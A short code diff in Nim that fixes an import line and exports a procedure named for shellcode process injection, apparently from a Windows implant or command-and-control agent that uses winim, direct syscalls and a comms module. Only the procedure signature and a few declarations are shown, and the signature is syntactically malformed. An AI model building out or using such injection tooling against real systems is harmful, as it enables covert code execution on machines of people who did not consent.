@@ -1,8 +1,8 @@
 import winim
-import import os, json, strformat, strutils
+import os, json, strformat, strutils
 import utils, comms, config, syscalls
 
-proc ProcessInjection_shellcode(pid: DWORD,cmd : string): = string 
+proc ProcessInjection_shellcode*(pid: DWORD,cmd : string): = string 
     #since the string is store asbytes under the hood we can just write it to memory
     oldProtect: DWORD
     RegionSize: PSIZE_T
